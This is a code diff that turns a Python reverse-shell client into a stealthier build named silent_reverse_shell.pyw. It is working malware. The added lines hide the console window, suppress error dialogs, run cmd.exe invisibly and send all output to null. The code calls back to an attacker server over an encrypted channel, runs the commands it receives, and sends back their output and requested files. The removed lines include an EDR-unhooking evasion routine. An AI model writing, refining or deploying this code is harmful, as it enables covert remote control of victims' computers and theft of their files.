@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# aes_reverse_shell_enhanced.py
+# silent_reverse_shell.pyw
 import socket
 import subprocess
 import sys
@@ -7,6 +7,22 @@ import os
 import time
 import ctypes
 from cryptography.fernet import Fernet
+
+# --- Hide Console Window Completely ---
+try:
+    kernel32 = ctypes.WinDLL('kernel32')
+    user32 = ctypes.WinDLL('user32')
+    
+    # Hide the console window if it exists
+    hwnd = kernel32.GetConsoleWindow()
+    if hwnd:
+        user32.ShowWindow(hwnd, 0)  # SW_HIDE
+    
+    # Also prevent new console windows from being created
+    kernel32.SetErrorMode(0x0001 | 0x0002)  # SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX
+    
+except:
+    pass
 
 # --- AES Configuration ---
 AES_KEY = b'jr8sI1WrJqL_5QyUe6j6H8V9g9vPKQO9v8lfdWpzhqk='
@@ -19,32 +35,12 @@ SERVER_PORT = 443
 # Global session state
 current_directory = os.getcwd()
 
-def unhook_dll(dll_name):
-    """Attempt to unhook DLL to bypass EDR hooks"""
-    try:
-        system32 = os.path.join(os.environ['WINDIR'], 'System32')
-        original_dll = os.path.join(system32, dll_name)
-        
-        ctypes.windll.kernel32.LoadLibraryW.restype = ctypes.c_void_p
-        ctypes.windll.kernel32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
-        dll_handle = ctypes.windll.kernel32.LoadLibraryW(original_dll)
-        
-        if dll_handle:
-            print(f"[+] Successfully unhooked {dll_name}")
-            return dll_handle
-    except Exception as e:
-        print(f"[-] Failed to unhook {dll_name}: {e}")
-    return None
-
 def execute_command(command):
-    """Execute command with session-aware context"""
+    """Execute command without opening any windows"""
     global current_directory
     
     try:
-        print(f"[DEBUG] Executing command: {command}")
-        print(f"[DEBUG] Current directory: {current_directory}")
-        
-        # Handle special commands that need session context
+        # Handle special commands
         if command.lower().startswith('cd '):
             new_dir = command[3:].strip()
             try:
@@ -56,11 +52,10 @@ def execute_command(command):
             except Exception as e:
                 return f"Error changing directory: {e}".encode('utf-8', 'ignore')
         
-        elif command.lower() == 'pwd' or command.lower() == 'cwd':
+        elif command.lower() in ['pwd', 'cwd']:
             return f"Current directory: {current_directory}".encode('utf-8', 'ignore')
         
         elif command.lower().startswith('download '):
-            # Handle file download requests
             file_path = command[9:].strip()
             if not os.path.isabs(file_path):
                 file_path = os.path.join(current_directory, file_path)
@@ -75,27 +70,33 @@ def execute_command(command):
             else:
                 return f"File not found: {file_path}".encode('utf-8', 'ignore')
         
-        # Execute regular commands in the current directory
+        # For Windows commands, we need to use cmd.exe but hide the window
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 0  # SW_HIDE
+        
+        # Use CREATE_NO_WINDOW flag to prevent ANY window creation
+        creation_flags = subprocess.CREATE_NO_WINDOW
+        
+        # Use cmd.exe /c to execute Windows commands but with hidden window
         process = subprocess.Popen(
-            command,
-            shell=True,
+            ['cmd.exe', '/c', command],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE,
             cwd=current_directory,
-            text=False  # Ensure binary output
+            text=False,
+            startupinfo=startupinfo,
+            creationflags=creation_flags
         )
         
-        # Use communicate() to avoid deadlocks
         stdout, stderr = process.communicate()
         output = stdout + stderr
         
-        print(f"[DEBUG] Command output length: {len(output)}")
         return output
         
     except Exception as e:
         error_msg = f"Error executing command: {e}".encode('utf-8', 'ignore')
-        print(f"[DEBUG] Error: {error_msg}")
         return error_msg
 
 def send_encrypted(sock, data):
@@ -107,25 +108,19 @@ def send_encrypted(sock, data):
         encrypted_data = cipher_suite.encrypt(data)
         length_prefix = len(encrypted_data).to_bytes(4, byteorder='big')
         sock.send(length_prefix + encrypted_data)
-        print(f"[DEBUG] Sent {len(data)} bytes (encrypted: {len(encrypted_data)} bytes)")
         return True
-    except Exception as e:
-        print(f"[-] Send error: {e}")
+    except Exception:
         return False
 
 def recv_encrypted(sock):
     """Receives and decrypts data with length prefix"""
     try:
-        # Get length prefix
         length_data = sock.recv(4)
         if not length_data:
-            print("[-] No length data received")
             return None
         
         encrypted_length = int.from_bytes(length_data, byteorder='big')
-        print(f"[DEBUG] Expecting {encrypted_length} bytes of encrypted data")
         
-        # Receive encrypted data
         encrypted_data = b''
         while len(encrypted_data) < encrypted_length:
             chunk = sock.recv(min(4096, encrypted_length - len(encrypted_data)))
@@ -134,15 +129,12 @@ def recv_encrypted(sock):
             encrypted_data += chunk
         
         if len(encrypted_data) != encrypted_length:
-            print(f"[-] Received {len(encrypted_data)} bytes, expected {encrypted_length}")
             return None
         
         decrypted_data = cipher_suite.decrypt(encrypted_data)
-        print(f"[DEBUG] Received and decrypted {len(decrypted_data)} bytes")
         return decrypted_data
         
-    except Exception as e:
-        print(f"[-] Receive error: {e}")
+    except Exception:
         return None
 
 def connect_to_server():
@@ -152,38 +144,26 @@ def connect_to_server():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(60)  # Increased timeout
+            s.settimeout(60)
             
-            print(f"[*] Connecting to {SERVER_IP}:{SERVER_PORT}")
             s.connect((SERVER_IP, SERVER_PORT))
-            print("[+] Connection established")
             
-            # EDR evasion attempts
-            unhook_dll('ntdll.dll')
-            unhook_dll('kernel32.dll')
-            
-            # Send welcome message with current directory
-            welcome_msg = f"Reverse shell connected successfully!\nCurrent directory: {current_directory}"
+            welcome_msg = f"Reverse shell connected!\nCurrent directory: {current_directory}"
             if not send_encrypted(s, welcome_msg):
-                print("[-] Failed to send welcome message")
                 s.close()
                 time.sleep(5)
                 continue
             
             # Main command loop
             while True:
-                print("[DEBUG] Waiting for command...")
                 encrypted_command = recv_encrypted(s)
                 if encrypted_command is None:
-                    print("[-] No command received or connection lost")
                     break
                 
                 try:
                     command = encrypted_command.decode('utf-8', 'ignore').strip()
-                    print(f"[DEBUG] Received command: {command}")
                 except Exception as e:
                     error_msg = f"Error decoding command: {e}"
-                    print(f"[-] {error_msg}")
                     send_encrypted(s, error_msg)
                     continue
 
@@ -195,31 +175,25 @@ def connect_to_server():
                     send_encrypted(s, "No command received")
                     continue
                 
-                # Execute command and send output
                 output = execute_command(command)
                 if not send_encrypted(s, output):
-                    print("[-] Failed to send command output")
                     break
             
             s.close()
-            print("[-] Connection closed, reconnecting in 5 seconds...")
             
-        except ConnectionRefusedError:
-            print("[-] Connection refused - is the server running?")
-        except socket.timeout:
-            print("[-] Connection timeout")
-        except Exception as e:
-            print(f"[-] Error: {e}")
+        except Exception:
+            pass
         
         time.sleep(5)
 
 if __name__ == "__main__":
+    # Complete silence - redirect all output to null
+    null_fd = os.open(os.devnull, os.O_RDWR)
+    os.dup2(null_fd, 1)  # stdout
+    os.dup2(null_fd, 2)  # stderr
+    
+    # Run as background process
     try:
-        print("[*] Enhanced AES Reverse Shell Client Starting...")
-        print(f"[*] Target: {SERVER_IP}:{SERVER_PORT}")
         connect_to_server()
-    except KeyboardInterrupt:
-        print("\n[!] Client stopped by user")
-    except Exception as e:
-        print(f"[-] Critical error: {e}")
-        input("Press Enter to exit...")
+    except:
+        sys.exit(0)
